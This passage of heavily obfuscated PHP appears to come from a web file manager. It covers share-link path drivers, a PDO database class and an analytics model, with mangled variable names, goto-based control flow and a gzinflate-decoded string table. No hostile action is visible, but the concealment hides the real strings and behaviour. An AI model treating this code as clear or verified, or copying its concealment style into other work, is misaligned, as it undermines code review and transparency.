$´Àœ…¢¡[$ÊµóÂ‚[425]]; } } $ê×Ëá‡Ğ = $ß›Ñº˜„; } unset($ê×Ëá‡Ğ); $ŠâÃ™Š = Model($ÊµóÂ‚[2477]); foreach ($ùŸ˜èà— as &$‹¯ÉêÆ´) { $±Íœâë = array(); if (isset($‡“›ì³×[$‹¯ÉêÆ´[$ÊµóÂ‚[1753]]])) { $±Íœâë = $‡“›ì³×[$‹¯ÉêÆ´[$ÊµóÂ‚[1753]]]; } $‹¯ÉêÆ´[$ÊµóÂ‚[2478]] = array(); if (isset($±Íœâë[$è¨‰Ïê¾])) { $‹¯ÉêÆ´[$ÊµóÂ‚[2478]] = $ŠâÃ™Š->getUserJobInfo($±Íœâë[$è¨‰Ïê¾]); } } unset($‹¯ÉêÆ´); } protected function groupUserAll($ŠÎ´Ò–Ù) { $‰¢›É¬Š =& $_SERVER[³à¼î¯á]; if (!$ŠÎ´Ò–Ù) { return !1; } $½Ñœ‘Ë· = Model($‰¢›É¬Š[2047])->field($‰¢›É¬Š[1753])->where(array($‰¢›É¬Š[1952] => array($‰¢›É¬Š[7], $ŠÎ´Ò–Ù)))->select(); $½Ñœ‘Ë· = array_to_keyvalue($½Ñœ‘Ë·, $‰¢›É¬Š[12], $‰¢›É¬Š[1753]); return array_unique($½Ñœ‘Ë·); } public function userSearch($úà’ú±ñ, $”š®‚é´ = "\52") { return Model($_SERVER[³à¼î¯á][574])->where($úà’ú±ñ)->field($”š®‚é´)->find(); } } goto dø·à¾çá; d‘¯ÈÇ•è: class PathDriverDriverShareItem { public function __construct($½®šÈ) { $this->pathParse = $½®šÈ; } public function __call($¡ÆšÚŞ , $¥ŠŸåıÜ) { $‘Í†Ò©ã =& $_SERVER[³à¼î¯á]; if (method_exists($this, $¡ÆšÚŞ )) { return; } $ÄíÍ‡ÏÕ = call_user_func_array(array($‘Í†Ò©ã[1397], $¡ÆšÚŞ ), $¥ŠŸåıÜ); $¸ˆÇ¼„ = array($‘Í†Ò©ã[1398], $‘Í†Ò©ã[1399], $‘Í†Ò©ã[1400], $‘Í†Ò©ã[1401], $‘Í†Ò©ã[593], $‘Í†Ò©ã[595], $‘Í†Ò©ã[1402], $‘Í†Ò©ã[110], $‘Í†Ò©ã[1403], $‘Í†Ò©ã[1404]); if (in_array($¡ÆšÚŞ , $¸ˆÇ¼„)) { $ÄíÍ‡ÏÕ = $this->getPathOuter($ÄíÍ‡ÏÕ); } return $ÄíÍ‡ÏÕ; } public function copy($‚Ó¡û¥œ, $Ù„æ¿ˆî, $Ô©¥Ñ¾Ô = false, $²íééŠ = false) { return $this->copyMove($‚Ó¡û¥œ, $Ù„æ¿ˆî, $Ô©¥Ñ¾Ô, $_SERVER[³à¼î¯á][593], $²íééŠ); } public function move($§«æÆˆ¸, $¾É½¹Û, $£¦›Îû£ = false, $›Ğ½åİÓ = false) { return $this->copyMove($§«æÆˆ¸, $¾É½¹Û, $£¦›Îû£, $_SERVER[³à¼î¯á][595], $›Ğ½åİÓ); } private function copyMove($µùî‘ÀÇ, $ğ˜²Ùââ, $™ Šû™Ê, $¿™×£„‚, $ÁŞçÙ±ú = false) { $çæá¦œÑ =& $_SERVER[³à¼î¯á]; $ø€²¤¶Ñ = $ğ˜²Ùââ; $º’Ê›´Â = IO::driverMake($ğ˜²Ùââ); if ($º’Ê›´Â->pathParse[$çæá¦œÑ[1204]]) { $ğ˜²Ùââ = $º’Ê›´Â->pathParse[$çæá¦œÑ[1204]]; } else { $ğ˜²Ùââ = $ø€²¤¶Ñ; } $ëö¹‚ş¬ = IO::copyMove($µùî‘ÀÇ, $ğ˜²Ùââ, $™ Šû™Ê, $¿™×£„‚, $ÁŞçÙ±ú); $ëö¹‚ş¬ = $this->getPathOuter($ëö¹‚ş¬); return $ëö¹‚ş¬; } public function pathThis($õíúÓÑ) { return get_path_this($this->pathParse[$_SERVER[³à¼î¯á][87]]); } public function pathFather($¢½Ü•æü) { return get_path_father($this->pathParse[$_SERVER[³à¼î¯á][87]]); } public function iconvSystem($²ğƒš…×) { return $²ğƒš…×; } protected function infoParse($–«µÆ‹, $¬úëÈ´  = false) { $›¼Ïß…È =& $_SERVER[³à¼î¯á]; $ ´¾ùÚö = $this->pathParse[$›¼Ïß…È[536]][$›¼Ïß…È[1229]] . $this->pathParse[$›¼Ïß…È[1222]]; if ($¬úëÈ´ ) { $„¡ÑŒöÏ = IO::infoWithChildren($ ´¾ùÚö); } else { $„¡ÑŒöÏ = IO::info($ ´¾ùÚö); } $ñë‰•›å = $this->pathParse[$›¼Ïß…È[536]]; return Action($›¼Ïß…È[1395])->_shareItemeParse($„¡ÑŒöÏ, $ñë‰•›å); } public function listAll($æŸ¦úˆİ) { $ÊÄ™ı‘ù =& $_SERVER[³à¼î¯á]; $¢¹Öûıµ = IO::listAll($æŸ¦úˆİ); $”Òò±ó¾ = rtrim($this->pathParse[$ÊÄ™ı‘ù[536]][$ÊÄ™ı‘ù[1229]], $ÊÄ™ı‘ù[8]); foreach ($¢¹Öûıµ as &$ÇÊÉ©ã¢) { $ÇÊÉ©ã¢[$ÊÄ™ı‘ù[87]] = $this->pathDriver . $ÊÄ™ı‘ù[8] . ltrim(substr($ÇÊÉ©ã¢[$ÊÄ™ı‘ù[87]], strlen($”Òò±ó¾)), $ÊÄ™ı‘ù[8]); } unset($ÇÊÉ©ã¢); return $¢¹Öûıµ; } public function listAllSimple($™¯Øòé, $‘İìºŞ = false) { $ğî¤¾Â =& $_SERVER[³à¼î¯á]; $ıà¤íã­ = $this->listAll($™¯Øòé); $’¦…ïæ = $this->pathParse[$ğî¤¾Â[470]]; if (trim($’¦…ïæ, $ğî¤¾Â[8]) == trim(get_path_father($’¦…ïæ), $ğî¤¾Â[8])) { $‘İìºŞ = !0; } return IO::init($ğî¤¾Â[12])->listAllSimpleMake($ıà¤íã­, $’¦…ïæ, $‘İìºŞ); } public function getPathOuter($šßïÙ¡Ï) { $‚Ğ÷†›é =& $_SERVER[³à¼î¯á]; $¡ÂÙ•¸æ = KodIO::parse($šßïÙ¡Ï); if ($¡ÂÙ•¸æ[$‚Ğ÷†›é[33]] == KodIO::KOD_SHARE_ITEM) { return $¡ÂÙ•¸æ[$‚Ğ÷†›é[87]]; } $ÙâÒøãÉ = KodIO::clear($šßïÙ¡Ï); $€ùÅóÙ§ = KodIO::clear($this->pathParse[$‚Ğ÷†›é[536]][$‚Ğ÷†›é[1229]]); $¤õ½‡–¿ = substr($ÙâÒøãÉ, strlen($€ùÅóÙ§)); if (substr($ÙâÒøãÉ, 0, strlen($€ùÅóÙ§)) != $€ùÅóÙ§) { return !1; } return $this->pathParse[$‚Ğ÷†›é[1223]] . $‚Ğ÷†›é[8] . ltrim($¤õ½‡–¿, $‚Ğ÷†›é[8]); } public function getType() { $Í´€îä =& $_SERVER[³à¼î¯á]; $–Ê˜£» = str_replace($Í´€îä[77], $Í´€îä[12], get_class($this)); return strtolower($–Ê˜£»); } public function isOsDriver($Ë¡ƒŠêÖ) { return IO::isOsDriver($Ë¡ƒŠêÖ); } public function info($¸Çç®Ë») { return $this->infoParse($¸Çç®Ë»); } public function infoAuth($£¾¡ªäê) { return $this->infoParse($£¾¡ªäê); } public function infoWithChildren($’¿÷ïèó) { return $this->infoParse($’¿÷ïèó, !0); } public function infoFull($áº£ï¡’) { return $this->infoParse($áº£ï¡’); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ıõª¢À) { $this->pathParse = $ıõª¢À; } protected function infoParse($¹©úÆ¡, $Ù±‰¶¿ø = false) { $óğùÇÈÈ =& $_SERVER[³à¼î¯á]; return Action($óğùÇÈÈ[1228])->sharePathInfo($this->pathParse[$óğùÇÈÈ[87]], !0, $Ù±‰¶¿ø); } public function listPath($¨Ø–“°…, $ÃˆİÁïâ = false) { $†­¬½‡÷ =& $_SERVER[³à¼î¯á]; $¬®õ™Ÿƒ = IO::listPath($¨Ø–“°…, $ÃˆİÁïâ); if (!$¬®õ™Ÿƒ) { return $¬®õ™Ÿƒ; } if (is_array($¬®õ™Ÿƒ[$†­¬½‡÷[1396]])) { $Š€ÕË¾ = Action($†­¬½‡÷[1405])->parsePathChildren($¬®õ™Ÿƒ[$†­¬½‡÷[1396]], array($†­¬½‡÷[470] => $¨Ø–“°…)); $¬®õ™Ÿƒ[$†­¬½‡÷[1396]] = Action($†­¬½‡÷[1228])->shareItemInfo($Š€ÕË¾); } foreach ($¬®õ™Ÿƒ as $‘ØŠÌˆß => $ÈÎœóÛà) { if (!in_array($‘ØŠÌˆß, array($†­¬½‡÷[86], $†­¬½‡÷[85]))) { continue; } foreach ($ÈÎœóÛà as $§õÂ„ÇÕ => $Š€ÕË¾) { $Š€ÕË¾ = Action($†­¬½‡÷[1405])->parsePathChildren($Š€ÕË¾, array($†­¬½‡÷[470] => $¨Ø–“°…)); $¬®õ™Ÿƒ[$‘ØŠÌˆß][$§õÂ„ÇÕ] = Action($†­¬½‡÷[1228])->shareItemInfo($Š€ÕË¾); } } return $¬®õ™Ÿƒ; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($ëè—É÷™) { parent::__construct($ëè—É÷™); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto c‰¤‘–£š; BÄáƒ£Ëøå: $_SERVER[í¡èúÆ] = explode($_SERVER[³à¼î¯á][655], gzinflate(substr($_SERVER[³à¼î¯á][656], 10, -8))); $jpokiulvfc = $_SERVER[³à¼î¯á][657]; if (strlen($jpokiulvfc) < $_SERVER[³à¼î¯á][658]) { return; } goto cĞï…ˆºê; D®øŞÔ¹‹ñ: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($œÜİ¥†à = '') { $çö¡…ê‚ =& $_SERVER[³à¼î¯á]; if (!class_exists($çö¡…ê‚[962])) { think_exception(think_lang($çö¡…ê‚[14]) . $çö¡…ê‚[963]); } if (!empty($œÜİ¥†à)) { $this->config = $œÜİ¥†à; if (empty($this->config[$çö¡…ê‚[17]])) { $this->config[$çö¡…ê‚[17]] = array(); } } } public function connect($¢†±ŠĞ” = '', $­™†¬¯ğ = 0) { $Å¾ŠöÌ³ =& $_SERVER[³à¼î¯á]; if (!isset($this->linkID[$­™†¬¯ğ])) { if (empty($¢†±ŠĞ”)) { $¢†±ŠĞ” = $this->config; } $‰¢ì›€¹ = !empty($¢†±ŠĞ”[$Å¾ŠöÌ³[17]][$Å¾ŠöÌ³[18]]) ? $¢†±ŠĞ”[$Å¾ŠöÌ³[17]][$Å¾ŠöÌ³[18]] : $this->pconnect; if ($‰¢ì›€¹) { $¢†±ŠĞ”[$Å¾ŠöÌ³[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$­™†¬¯ğ] = new PDO($¢†±ŠĞ”[$Å¾ŠöÌ³[964]], $¢†±ŠĞ”[$Å¾ŠöÌ³[936]], $¢†±ŠĞ”[$Å¾ŠöÌ³[937]], $¢†±ŠĞ”[$Å¾ŠöÌ³[17]]); } catch (PDOException $ÚÜØåµ) { think_exception($ÚÜØåµ->getMessage()); } $this->dbType = $this->_getDsnType($¢†±ŠĞ”[$Å¾ŠöÌ³[964]]); if (in_array($this->dbType, array($Å¾ŠöÌ³[965], $Å¾ŠöÌ³[966], $Å¾ŠöÌ³[967], $Å¾ŠöÌ³[968]))) { think_exception($Å¾ŠöÌ³[969] . $this->dbType . $Å¾ŠöÌ³[970] . $this->dbType . $Å¾ŠöÌ³[971]); } if (!$this->linkID[$­™†¬¯ğ]) { think_exception($Å¾ŠöÌ³[972]); } try { $this->linkID[$­™†¬¯ğ]->exec($Å¾ŠöÌ³[973] . think_config($Å¾ŠöÌ³[939])); } catch (Exception $ÚÜØåµ) { } $this->connected = !0; if (1 != think_config($Å¾ŠöÌ³[22])) { unset($this->config); } } return $this->linkID[$­™†¬¯ğ]; } public function free() { $this->PDOStatement = null; } public function query($ú¡á®›, $×ÔÇñÆˆ = array()) { $…Ó…Ê  =& $_SERVER[³à¼î¯á]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ú¡á®›; if (!empty($×ÔÇñÆˆ)) { $this->queryStr .= $…Ó…Ê [974] . print_r($×ÔÇñÆˆ, !0) . $…Ó…Ê [975]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($…Ó…Ê [23], 1); think_status($…Ó…Ê [24]); $this->PDOStatement = $this->_linkID->prepare($ú¡á®›); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $½Ê¨®ã = $this->PDOStatement->execute($×ÔÇñÆˆ); $this->debug(); if (!1 === $½Ê¨®ã) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($è×»­™, $Æìáäƒ” = array()) { $®Ñı—–Ó =& $_SERVER[³à¼î¯á]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $è×»­™; if (!empty($Æìáäƒ”)) { $this->queryStr .= $®Ñı—–Ó[974] . print_r($Æìáäƒ”, !0) . $®Ñı—–Ó[975]; } $î¡Øëñ¯ = !1; if ($this->dbType == $®Ñı—–Ó[968]) { if (preg_match($®Ñı—–Ó[976], $this->queryStr, $©õ·°”ø)) { $this->table = think_config($®Ñı—–Ó[977]) . str_ireplace(think_config($®Ñı—–Ó[978]), $®Ñı—–Ó[429], $©õ·°”ø[2]); $î¡Øëñ¯ = (bool) $this->query($®Ñı—–Ó[979] . strtoupper($this->table) . $®Ñı—–Ó[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($®Ñı—–Ó[25], 1); think_status($®Ñı—–Ó[24]); $this->PDOStatement = $this->_linkID->prepare($è×»­™); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $û¯İà = $this->PDOStatement->execute($Æìáäƒ”); $this->debug(); if (!1 === $û¯İà) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($î¡Øëñ¯ || preg_match($®Ñı—–Ó[980], $è×»­™)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ñ—ùëÈ¼ = $this->_linkID->commit(); $this->transTimes = 0; if (!$ñ—ùëÈ¼) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $çì‡•û† = $this->_linkID->rollback(); $this->transTimes = 0; if (!$çì‡•û†) { $this->error(); return !1; } } return !0; } private function getAll() { $›Ç—ô = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($›Ç—ô); return $›Ç—ô; } public function getFields($ì¡•ñØÜ) { $“İüüÀ =& $_SERVER[³à¼î¯á]; $this->initConnect(!0); if (think_config($“İüüÀ[981])) { $“‚ïÓ¶õ = str_replace($“İüüÀ[982], $ì¡•ñØÜ, think_config($“İüüÀ[981])); } else { switch ($this->dbType) { case $“İüüÀ[965]: case $“İüüÀ[983]: $“‚ïÓ¶õ = "\x53\x45\x4c\105\103\x54\40\x20\40\143\x6f\154\x75\x6d\x6e\x5f\x6e\141\155\x65\40\141\163\x20\47\x4e\141\x6d\x65\x27\54\40\x20\x20\144\x61\164\141\x5f\x74\171\160\x65\x20\x61\x73\x20\47\x54\171\x70\145\x27\x2c\40\x20\40\x63\157\154\165\x6d\156\137\144\x65\x66\x61\165\154\164\40\141\x73\x20\x27\x44\145\146\x61\x75\154\164\x27\54\x20\40\x20\151\x73\x5f\x6e\x75\x6c\154\x61\x62\x6c\145\40\x61\x73\40\x27\116\x75\x6c\x6c\47\xa\11\11\x46\122\x4f\115\11\151\156\146\157\162\x6d\x61\x74\151\157\156\137\163\x63\x68\145\x6d\141\56\x74\141\x62\x6c\x65\x73\40\101\123\x20\x74\12\11\x9\112\x4f\x49\x4e\11\151\156\146\157\162\x6d\x61\x74\x69\157\156\x5f\163\x63\x68\x65\155\x61\56\x63\157\x6c\165\x6d\156\163\40\101\x53\40\143\xa\x9\11\x4f\116\40\40\164\56\x74\x61\142\x6c\x65\137\143\x61\x74\141\154\157\x67\x20\x3d\x20\143\x2e\x74\x61\142\x6c\145\x5f\143\141\x74\141\x6c\x6f\x67\12\x9\x9\101\x4e\x44\40\x74\x2e\x74\x61\x62\154\145\x5f\x73\x63\x68\x65\155\141\x20\x3d\x20\x63\56\164\141\142\154\x65\x5f\163\x63\x68\145\155\x61\xa\x9\x9\x41\x4e\x44\40\164\x2e\164\x61\x62\x6c\x65\137\156\141\x6d\145\x20\x3d\x20\143\56\164\141\142\x6c\145\x5f\156\141\x6d\x65\xa\x9\x9\x57\110\x45\122\105\40\40\40\x74\56\164\141\x62\x6c\x65\x5f\156\141\155\x65\x20\75\40\x27{$ì¡•ñØÜ}\47"; break; case $“İüüÀ[984]: $“‚ïÓ¶õ = $“İüüÀ[985] . $ì¡•ñØÜ . $“İüüÀ[986]; break; case $“İüüÀ[966]: case $“İüüÀ[968]: $“‚ïÓ¶õ = $“İüüÀ[987] . $“İüüÀ[988] . $“İüüÀ[989] . strtoupper($ì¡•ñØÜ) . $“İüüÀ[990] . strtoupper($ì¡•ñØÜ) . $“İüüÀ[991]; break; case $“İüüÀ[992]: $“‚ïÓ¶õ = $“İüüÀ[993] . $ì¡•ñØÜ . $“İüüÀ[994]; break; case $“İüüÀ[967]: break; case $“İüüÀ[995]: default: $“‚ïÓ¶õ = $“İüüÀ[996] . ($this->dbType == $“İüüÀ[995] ? "\x60{$ì¡•ñØÜ}\140" : $ì¡•ñØÜ); } } $ĞıŒ›š = $this->query($“‚ïÓ¶õ); $¨†œåû° = array(); if ($ĞıŒ›š) { foreach ($ĞıŒ›š as $İË¹ÉÏÑ => $½“ÄŒ‚¤) { $½“ÄŒ‚¤ = array_change_key_case($½“ÄŒ‚¤); $½“ÄŒ‚¤[$“İüüÀ[32]] = isset($½“ÄŒ‚¤[$“İüüÀ[32]]) ? $½“ÄŒ‚¤[$“İüüÀ[32]] : $“İüüÀ[429]; $½“ÄŒ‚¤[$“İüüÀ[33]] = isset($½“ÄŒ‚¤[$“İüüÀ[33]]) ? $½“ÄŒ‚¤[$“İüüÀ[33]] : $“İüüÀ[429]; $Œ´×¢ÖÒ = isset($½“ÄŒ‚¤[$“İüüÀ[325]]) ? $½“ÄŒ‚¤[$“İüüÀ[325]] : $½“ÄŒ‚¤[$“İüüÀ[32]]; $¨†œåû°[$Œ´×¢ÖÒ] = array($“İüüÀ[32] => $Œ´×¢ÖÒ, $“İüüÀ[33] => $½“ÄŒ‚¤[$“İüüÀ[33]], $“İüüÀ[35] => (bool) (isset($½“ÄŒ‚¤[$“İüüÀ[106]]) && $½“ÄŒ‚¤[$“İüüÀ[106]] === $“İüüÀ[12] || isset($½“ÄŒ‚¤[$“İüüÀ[35]]) && $½“ÄŒ‚¤[$“İüüÀ[35]] === $“İüüÀ[12]), $“İüüÀ[37] => isset($½“ÄŒ‚¤[$“İüüÀ[37]]) ? $½“ÄŒ‚¤[$“İüüÀ[37]] : (isset($½“ÄŒ‚¤[$“İüüÀ[56]]) ? $½“ÄŒ‚¤[$“İüüÀ[56]] : $“İüüÀ[429]), $“İüüÀ[39] => isset($½“ÄŒ‚¤[$“İüüÀ[97]]) ? strtolower($½“ÄŒ‚¤[$“İüüÀ[97]]) == $“İüüÀ[41] : (isset($½“ÄŒ‚¤[$“İüüÀ[57]]) ? $½“ÄŒ‚¤[$“İüüÀ[57]] : !1), $“İüüÀ[42] => isset($½“ÄŒ‚¤[$“İüüÀ[997]]) ? strtolower($½“ÄŒ‚¤[$“İüüÀ[997]]) == $“İüüÀ[44] : (isset($½“ÄŒ‚¤[$“İüüÀ[97]]) ? $½“ÄŒ‚¤[$“İüüÀ[97]] : !1)); } } return $¨†œåû°; } public function getTables($·™é«Ü = '') { $õøâ²Öå =& $_SERVER[³à¼î¯á]; if (think_config($õøâ²Öå[998])) { $™“°ñ™¶ = str_replace($õøâ²Öå[999], $·™é«Ü, think_config($õøâ²Öå[998])); } else { switch ($this->dbType) { case $õøâ²Öå[966]: case $õøâ²Öå[968]: $™“°ñ™¶ = $õøâ²Öå[1000]; break; case $õøâ²Öå[965]: case $õøâ²Öå[983]: $™“°ñ™¶ = $õøâ²Öå[1001]; break; case $õøâ²Öå[992]: $™“°ñ™¶ = $õøâ²Öå[1002]; break; case $õøâ²Öå[967]: think_exception(think_lang($õøâ²Öå[1003]) . $õøâ²Öå[1004]); break; case $õøâ²Öå[984]: $™“°ñ™¶ = $õøâ²Öå[45] . $õøâ²Öå[46] . $õøâ²Öå[47]; break; case $õøâ²Öå[995]: default: if (!empty($·™é«Ü)) { $™“°ñ™¶ = $õøâ²Öå[947] . $·™é«Ü . $õøâ²Öå[948]; } else { $™“°ñ™¶ = $õøâ²Öå[949]; } } } $Ùı’ ¸Â = $this->query($™“°ñ™¶); $˜³Ã¿ñ× = array(); foreach ($Ùı’ ¸Â as $ÙŠÙ±µ => $‰Š°â½) { $˜³Ã¿ñ×[$ÙŠÙ±µ] = current($‰Š°â½); } return $˜³Ã¿ñ×; } protected function parseLimit($“Ä–”§ü) { $­®ëÔİ± =& $_SERVER[³à¼î¯á]; $Øï…‹şŒ = $­®ëÔİ±[12]; if (!empty($“Ä–”§ü)) { switch ($this->dbType) { case $­®ëÔİ±[992]: case $­®ëÔİ±[984]: $“Ä–”§ü = explode($­®ëÔİ±[50], $“Ä–”§ü); if (count($“Ä–”§ü) > 1) { $Øï…‹şŒ .= $­®ëÔİ±[51] . $“Ä–”§ü[1] . $­®ëÔİ±[52] . $“Ä–”§ü[0] . $­®ëÔİ±[53]; } else { $Øï…‹şŒ .= $­®ëÔİ±[51] . $“Ä–”§ü[0] . $­®ëÔİ±[53]; } break; case $­®ëÔİ±[965]: case $­®ëÔİ±[983]: break; case $­®ëÔİ±[967]: break; case $­®ëÔİ±[966]: case $­®ëÔİ±[968]: break; case $­®ëÔİ±[995]: default: $Øï…‹şŒ .= $­®ëÔİ±[51] . $“Ä–”§ü . $­®ëÔİ±[53]; } } return $Øï…‹şŒ; } public function parseKey(&$Ğø¸ ¶Ç, $ËÇú¥—ï = true) { $€ÌæôœŠ =& $_SERVER[³à¼î¯á]; if ($ËÇú¥—ï) { $Ğø¸ ¶Ç = $this->parseKeyCheck($Ğø¸ ¶Ç); } if ($this->dbType == $€ÌæôœŠ[995]) { if ($Ğø¸ ¶Ç != $€ÌæôœŠ[211] && !preg_match($€ÌæôœŠ[959], $Ğø¸ ¶Ç)) { $Ğø¸ ¶Ç = $€ÌæôœŠ[436] . trim($Ğø¸ ¶Ç, $€ÌæôœŠ[436]) . $€ÌæôœŠ[436]; } return $Ğø¸ ¶Ç; } else { return parent::parseKey($Ğø¸ ¶Ç, $ËÇú¥—ï); } } public function close() { $this->_linkID = null; } public function error() { $êÓõªÍµ =& $_SERVER[³à¼î¯á]; if ($this->PDOStatement) { $æñÎ³³Õ = $this->PDOStatement->errorInfo(); $this->error = $æñÎ³³Õ[1] . $êÓõªÍµ[4] . $æñÎ³³Õ[2]; } else { $this->error = $êÓõªÍµ[12]; } if ($êÓõªÍµ[12] != $this->queryStr) { $this->error .= LNG($êÓõªÍµ[48]) . $this->queryStr; } think_trace($this->error, $êÓõªÍµ[12], $êÓõªÍµ[49]); return $this->error; } public function escapeString($½¥ûÓ­Ï) { $Ö¡ÜÑºå =& $_SERVER[³à¼î¯á]; switch ($this->dbType) { case $Ö¡ÜÑºå[992]: case $Ö¡ÜÑºå[965]: case $Ö¡ÜÑºå[983]: case $Ö¡ÜÑºå[995]: return addslashes($½¥ûÓ­Ï); case $Ö¡ÜÑºå[967]: case $Ö¡ÜÑºå[984]: case $Ö¡ÜÑºå[966]: case $Ö¡ÜÑºå[968]: return str_ireplace($Ö¡ÜÑºå[58], $Ö¡ÜÑºå[59], $½¥ûÓ­Ï); } } protected function parseValue($ÀŒò„à) { $Ë¯ñ¨äÑ =& $_SERVER[³à¼î¯á]; if (is_string($ÀŒò„à)) { $ĞèÇ³ª³ = strpos($ÀŒò„à, $Ë¯ñ¨äÑ[4]) === 0 && in_array($ÀŒò„à, array_keys($this->bind)); $ÀŒò„à = $ĞèÇ³ª³ ? $this->escapeString($ÀŒò„à) : $Ë¯ñ¨äÑ[1005] . $this->escapeString($ÀŒò„à) . $Ë¯ñ¨äÑ[1005]; } elseif (isset($ÀŒò„à[0]) && is_string($ÀŒò„à[0]) && strtolower($ÀŒò„à[0]) == $Ë¯ñ¨äÑ[348]) { $ÀŒò„à = $this->escapeString($ÀŒò„à[1]); } elseif (is_array($ÀŒò„à)) { $ÀŒò„à = array_map(array($this, $Ë¯ñ¨äÑ[1006]), $ÀŒò„à); } elseif (is_bool($ÀŒò„à)) { $ÀŒò„à = $ÀŒò„à ? $Ë¯ñ¨äÑ[91] : $Ë¯ñ¨äÑ[219]; } elseif (is_null($ÀŒò„à)) { $ÀŒò„à = $Ë¯ñ¨äÑ[106]; } return $ÀŒò„à; } public function getLastInsertId() { $ÁÔ‚«ş± =& $_SERVER[³à¼î¯á]; switch ($this->dbType) { case $ÁÔ‚«ş±[992]: case $ÁÔ‚«ş±[984]: case $ÁÔ‚«ş±[965]: case $ÁÔ‚«ş±[983]: case $ÁÔ‚«ş±[967]: case $ÁÔ‚«ş±[995]: return $this->_linkID->lastInsertId(); case $ÁÔ‚«ş±[966]: case $ÁÔ‚«ş±[968]: $éïÍğç® = $this->table; $½ÜĞ®ÉÀ = $this->query("\123\105\x4c\x45\103\124\40{$éïÍğç®}\x2e\x63\165\x72\162\166\x61\154\x20\143\x75\162\162\166\x61\154\40\x46\x52\x4f\x4d\40\x64\165\x61\x6c"); return $½ÜĞ®ÉÀ ? $½ÜĞ®ÉÀ[0][$ÁÔ‚«ş±[1007]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($Ô‘éãÃô) { $—ÛŠ˜¨ê =& $_SERVER[³à¼î¯á]; if (!CacheLock::fileLock($—ÛŠ˜¨ê[13])) { return !1; } $ƒ”Æí“£ = parent::query($Ô‘éãÃô); CacheLock::fileUnLock($—ÛŠ˜¨ê[13]); return $ƒ”Æí“£; } public function execute($€˜÷ÅŸ ) { $ëƒÖÕ“Ô =& $_SERVER[³à¼î¯á]; if (!CacheLock::fileLock($ëƒÖÕ“Ô[13])) { return !1; } $ÆıÜ¹ÊÒ = parent::execute($€˜÷ÅŸ ); CacheLock::fileUnLock($ëƒÖÕ“Ô[13]); return $ÆıÜ¹ÊÒ; } } class DbSqlite3 extends DbSqlite3Base { public function query($Ø°‘Í„˜) { $ÀÓ¡Ô£ =& $_SERVER[³à¼î¯á]; if (!CacheLock::fileLock($ÀÓ¡Ô£[13])) { return !1; } $ÛÎ™¤Ò = parent::query($Ø°‘Í„˜); CacheLock::fileUnLock($ÀÓ¡Ô£[13]); return $ÛÎ™¤Ò; } public function execute($ĞÖôãÛ¾) { $Ö××ßõÉ =& $_SERVER[³à¼î¯á]; if (!CacheLock::fileLock($Ö××ßõÉ[13])) { return !1; } $¿ÇÏù­æ = parent::execute($ĞÖôãÛ¾); CacheLock::fileUnLock($Ö××ßõÉ[13]); return $¿ÇÏù­æ; } } goto f§§‘Ş²ŸÙ; bšŠ›œ„á: class AnalysisModel extends ModelBaseLight { public function init($¯„ÂÆô‘) { $èì®ˆÊÛ =& $_SERVER[³à¼î¯á]; $¼£‘”Îì = array($èì®ˆÊÛ[637] => array($èì®ˆÊÛ[33] => $èì®ˆÊÛ[1881], $èì®ˆÊÛ[325] => array($èì®ˆÊÛ[246], $èì®ˆÊÛ[810], $èì®ˆÊÛ[1882], $èì®ˆÊÛ[1883])), $èì®ˆÊÛ[1884] => array($èì®ˆÊÛ[33] => $èì®ˆÊÛ[1885], $èì®ˆÊÛ[325] => array($èì®ˆÊÛ[246], $èì®ˆÊÛ[808], $èì®ˆÊÛ[1886], $èì®ˆÊÛ[1887], $èì®ˆÊÛ[1888]))); if (!isset($¼£‘”Îì[$¯„ÂÆô‘])) { return !1; } $this->optionType = $¼£‘”Îì[$¯„ÂÆô‘][$èì®ˆÊÛ[33]]; $this->field = $¼£‘”Îì[$¯„ÂÆô‘][$èì®ˆÊÛ[325]]; return !0; } public function listData($ªûó’åí = false, $øÆÕêÊü = "\155\x6f\144\x69\x66\x79\124\151\x6d\145", $Šç½™ûÌ = false) { return parent::listData($ªûó’åí, $øÆÕêÊü, $Šç½™ûÌ); } public function trendList($™çªÍÛà) { $Ô†ÒûòÄ =& $_SERVER[³à¼î¯á]; $ü£Å›ƒ… = $this->listData(); if ($ü£Å›ƒ…) { $ÁŞÛ‘ÏŞ = end($ü£Å›ƒ…); $‹†ÜÈÆæ = date($Ô†ÒûòÄ[1889], strtotime($Ô†ÒûòÄ[1890])); if ($ÁŞÛ‘ÏŞ[$Ô†ÒûòÄ[246]] == $‹†ÜÈÆæ) { return $ü£Å›ƒ…; } $ç€òÏ³Ô = strtotime($ÁŞÛ‘ÏŞ[$Ô†ÒûòÄ[246]]); } if (!isset($ç€òÏ³Ô)) { $³éú½© = $™çªÍÛà == $Ô†ÒûòÄ[637] ? $Ô†ÒûòÄ[574] : $Ô†ÒûòÄ[869]; $ç€òÏ³Ô = Model($³éú½©)->min($Ô†ÒûòÄ[222]); } $˜–µ¾Î» = $Ô†ÒûòÄ[1891] . ucfirst($™çªÍÛà); $¤Ïó¹„’ = $this->dateList($ç€òÏ³Ô); foreach ($¤Ïó¹„’ as $‹†ÜÈÆæ) { $this->{$˜–µ¾Î»}($‹†ÜÈÆæ); } return $this->listData(); } private function dateList($ïãçæî¼) { $±Çäî´ =& $_SERVER[³à¼î¯á]; $Å¹¯‹Å = $ïãçæî¼; $çĞ¦¿Æõ = 